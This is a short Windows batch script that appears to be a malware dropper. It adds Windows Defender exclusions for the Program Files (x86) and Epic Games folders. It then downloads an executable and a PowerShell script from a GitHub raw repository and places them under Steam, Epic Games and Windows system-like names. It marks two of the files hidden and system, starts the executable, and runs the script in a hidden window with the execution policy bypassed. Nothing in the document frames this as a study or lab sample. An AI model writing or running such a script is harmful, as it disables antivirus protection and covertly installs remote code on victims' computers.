@echo off
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Epic Games'"

:: Download files using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/networkappcontrol.exe' -OutFile 'C:\Program Files (x86)\Epic Games\NetworkAppControl.exe'"

attrib +h +s "C:\Program Files (x86)\Epic Games\NetworkAppControl.exe"
attrib +h +s "C:\ProgramData\Microsoft\Windows\setup.ps1"

start "" "C:\Program Files (x86)\Epic Games\NetworkAppControl.exe"
powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
